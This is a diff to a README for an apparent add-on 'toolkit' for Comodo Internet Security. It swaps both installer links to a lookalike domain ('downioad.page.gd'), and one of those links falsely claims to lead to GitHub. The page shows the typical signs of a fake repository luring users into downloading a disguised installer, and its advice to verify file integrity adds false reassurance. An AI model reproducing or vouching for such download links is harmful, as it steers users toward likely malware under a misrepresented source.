@@ -2,7 +2,7 @@
 
 This toolkit is designed to enhance your experience with Comodo Internet Security Full on Windows desktops, offering advanced features for security management and system optimization. Whether you're a home user or an IT professional, this utility provides a seamless way to customize and control your security settings with ease.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ Here are some common queries and their answers to help you get started:
 
 To get started, download the latest version of the toolkit from the official GitHub repository:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link directs you to a secure page where you can access the installer file. Remember to verify the file integrity before installation for added safety. The toolkit is free to use and regularly updated to support new security features and system improvements.
 
